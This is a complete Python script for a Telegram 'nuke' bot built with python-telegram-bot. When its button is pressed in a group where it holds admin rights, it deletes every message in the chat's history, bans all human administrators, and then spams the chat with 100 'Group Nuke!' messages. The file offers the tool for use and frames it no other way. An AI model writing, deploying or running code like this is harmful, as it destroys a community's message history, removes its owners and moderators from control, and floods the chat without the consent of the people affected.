from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext
import asyncio

TOKEN = 'YOUR_BOT_TOKEN'  # Replace with your bot token


async def start(update: Update, context: CallbackContext) -> None:
    """Sends a message with an inline button."""
    keyboard = [[InlineKeyboardButton("♱ Nuke Group ♱", callback_data='Nuke')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Ready to nuke? Press the button!", reply_markup=reply_markup)


async def button(update: Update, context: CallbackContext) -> None:
    """Handles the button press, nuking the group."""
    query = update.callback_query
    await query.answer()

    if query.data == 'Nuke':
        chat_id = query.message.chat.id
        try:
            try:
                for message_id in range(1, query.message.message_id + 1):
                    await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
            except Exception as delete_error:
                print(f"Error deleting messages: {delete_error}")
                await query.message.reply_text(f"Error deleting messages: {delete_error}")

            try:
                admins = await context.bot.get_chat_administrators(chat_id=chat_id)
                non_bot_user_ids = [member.user.id for member in admins if not member.user.is_bot]
                for user_id in non_bot_user_ids:
                    await context.bot.ban_chat_member(chat_id=chat_id, user_id=user_id)
            except Exception as ban_error:
                print(f"Error banning members: {ban_error}")
                await query.message.reply_text(f"Error banning members: {ban_error}")

            for count in range(100):
                try:
                    await context.bot.send_message(chat_id=chat_id, text=f"💥 Group Nuke! {count} 💥")
                    await asyncio.sleep(0.5)
                except Exception as send_error:
                    print(f"Error sending message: {send_error}")
                    await query.message.reply_text(f"Nuke interrupted: {send_error}")
                    break

            await query.message.reply_text("Nuke sequence completed (with limitations).")

        except Exception as overall_error:
            print(f"Nuke failed: {overall_error}")
            await query.message.reply_text(f"Nuke failed: {overall_error}")
    else:
        await query.message.reply_text("Invalid button.")


async def main():
    """Starts the bot."""
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))

    print("Bot is running...")
    await app.run_polling()


if __name__ == '__main__':
    asyncio.run(main())